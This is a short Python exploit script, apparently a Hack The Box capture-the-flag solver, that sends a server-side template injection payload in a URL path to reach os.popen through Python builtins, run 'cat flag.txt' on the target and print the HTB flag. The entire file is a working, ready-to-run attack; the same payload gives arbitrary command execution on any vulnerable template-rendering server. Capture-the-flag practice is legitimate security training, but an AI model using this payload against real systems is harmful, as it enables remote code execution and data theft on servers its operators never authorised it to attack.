import sys
import requests
import re
# urllib for url-encoding
from urllib.parse import quote

def run_exploit(host):
    #SSTI payload
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"
    encoded_payload = quote(payload)
    url = f"http://{host}/{encoded_payload}"

    try:
        #Send GET request to application
        response = requests.get(url, timeout=5)
        response.raise_for_status()
    except Exception as e:
        print(f"Request failed: {e}")
        sys.exit(1)

    #Search for the flag in response
    flag = re.search(r"HTB\{.*?\}", response.text)
    if flag:
        print(f"Flag: {flag.group(0)}")
    else:
        print("Flag not found in response")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py ip:port")
        sys.exit(1)

    run_exploit(sys.argv[1])
